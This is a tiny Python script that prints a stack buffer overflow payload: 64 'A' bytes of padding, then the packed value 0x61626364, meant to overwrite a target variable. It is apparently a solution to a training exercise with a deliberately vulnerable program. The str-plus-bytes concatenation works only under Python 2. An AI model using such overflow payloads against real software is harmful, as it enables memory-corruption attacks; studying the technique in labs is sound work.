import struct

padding = "A" * 64

# Value that will be written to the target variable
value = struct.pack("I", 0x61626364)

print(padding + value)
